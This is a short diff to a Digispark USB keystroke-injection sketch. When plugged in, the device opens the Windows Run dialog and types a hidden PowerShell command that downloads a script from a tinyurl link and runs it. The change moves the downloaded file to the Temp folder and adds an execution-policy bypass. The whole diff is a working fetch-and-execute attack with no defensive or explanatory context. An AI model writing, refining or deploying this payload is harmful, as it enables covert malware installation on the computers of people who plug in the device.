@@ -8,7 +8,7 @@ void loop() {
   DigiKeyboard.sendKeyStroke(0);
   DigiKeyboard.sendKeyStroke(KEY_R,MOD_GUI_LEFT);
   DigiKeyboard.delay(500);
-  DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'https://tinyurl.com/2z3c8psr\', \\\"$env:UserProfile\\maltsu.ps1\\\"); powershell -c \\\"$env:UserProfile\\maltsu.ps1\\\"\"");
+  DigiKeyboardFi.print("powershell -w Hidden -c \"(New-Object System.Net.WebClient).DownloadFile(\'https://tinyurl.com/588af6f2\', \\\"$env:Temp\\maltsu.ps1\\\"); powershell -ExecutionPolicy Bypass \\\"$env:Temp\\maltsu.ps1\\\"\"");
   DigiKeyboard.delay(1000);
   DigiKeyboard.sendKeyStroke(KEY_ENTER);
   DigiKeyboard.delay(3000);
